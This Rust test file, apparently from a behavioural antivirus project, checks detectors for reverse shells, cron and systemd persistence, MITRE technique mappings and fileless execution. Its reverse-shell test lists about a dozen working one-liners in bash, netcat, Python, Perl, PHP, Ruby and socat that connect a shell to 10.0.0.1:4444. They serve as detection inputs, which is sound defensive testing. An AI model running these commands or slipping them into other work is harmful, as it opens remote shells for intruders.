//! Enterprise-focused detection tests (Atomic Red Team-style patterns).

mod regression {
    include!("../../tests/detection_tests.rs");
}

use av_behavioral::detection::{command_and_control, fileless, persistence, MitreMapping};

mod reverse_shell_tests {
    use super::*;

    #[test]
    fn detects_atomic_red_team_reverse_shells() {
        let attack_patterns = vec![
            // T1059.004 - Unix Shell
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
            "0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196",
            // Netcat variants
            "nc -e /bin/sh 10.0.0.1 4444",
            "nc -c /bin/sh 10.0.0.1 4444",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
            // Python
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            // Perl
            "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            // PHP
            "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            // Ruby
            "ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            // Socat
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444",
        ];

        for pattern in attack_patterns {
            let result = command_and_control::detect_reverse_shell_cmdline(pattern);
            assert!(result.is_some(), "Should detect reverse shell: {}", pattern);
        }
    }

    #[test]
    fn does_not_flag_legitimate_commands() {
        let legitimate_commands = vec![
            "cargo build --release",
            "git push origin main",
            "curl https://api.github.com/users",
            "wget https://rust-lang.org/install.sh",
            "python3 manage.py runserver",
            "nc -l 8080",
            "ssh user@server.com",
            "scp file.txt user@server:/path",
        ];

        for cmd in legitimate_commands {
            let result = command_and_control::detect_reverse_shell_cmdline(cmd);
            assert!(
                result.is_none(),
                "Should NOT flag legitimate command: {}",
                cmd
            );
        }
    }
}

mod persistence_tests {
    use super::*;

    #[test]
    fn detects_cron_persistence_paths() {
        let cron_paths = vec![
            "/etc/crontab",
            "/etc/cron.d/backdoor",
            "/etc/cron.hourly/miner",
            "/var/spool/cron/crontabs/root",
        ];

        for path in cron_paths {
            let result = persistence::detect_cron_modification(
                path,
                persistence::FileOperation::Create,
                1234,
                "malicious",
            );
            assert!(result.is_some(), "Should detect cron persistence: {}", path);
        }
    }

    #[test]
    fn detects_systemd_persistence() {
        let systemd_paths = vec![
            "/etc/systemd/system/backdoor.service",
            "/lib/systemd/system/hidden.service",
            "/run/systemd/system/temp.service",
        ];

        for path in systemd_paths {
            let result = persistence::detect_systemd_modification(
                path,
                persistence::FileOperation::Create,
                1234,
                "malicious",
            );
            assert!(
                result.is_some(),
                "Should detect systemd persistence: {}",
                path
            );
        }
    }

    #[test]
    fn package_manager_exceptions() {
        let legitimate_tools = vec!["apt", "dpkg", "yum", "dnf", "pacman"];

        for tool in legitimate_tools {
            let result = persistence::detect_cron_modification(
                "/etc/cron.d/package-update",
                persistence::FileOperation::Create,
                1234,
                tool,
            );
            assert!(
                result.is_none(),
                "Should NOT flag package manager: {}",
                tool
            );
        }
    }
}

mod mitre_coverage_tests {
    use super::*;

    #[test]
    fn technique_lookup_has_required_entries() {
        let required = vec![
            "T1059.004", // Unix Shell
            "T1053.003", // Cron
            "T1543.002", // Systemd Service
            "T1620",     // Reflective Code Loading
            "T1055.008", // Ptrace
            "T1574.006", // Dynamic Linker Hijacking
            "T1571",     // Non-Standard Port
            "T1547.006", // Kernel Module
            "T1098.004", // SSH Keys
            "T1552.001", // Credentials in Files
        ];

        for technique in required {
            let mapping = MitreMapping::new(technique);
            assert_ne!(
                mapping.technique_name, "Unknown",
                "Missing MITRE mapping for: {}",
                technique
            );
        }
    }
}

#[test]
fn full_pipeline_smoke_test() {
    let pid = std::process::id();

    // Current process should NOT trigger memfd detection.
    let memfd_alert = fileless::detect_memfd_execution(pid);
    assert!(memfd_alert.is_none(), "Normal process flagged for memfd");

    // If system-wide /etc/ld.so.preload is configured, allow that signal (pid=0).
    if let Some(alert) = fileless::detect_ld_preload_injection(pid) {
        assert_eq!(
            alert.pid, 0,
            "Normal process flagged for LD_PRELOAD injection"
        );
    }
}
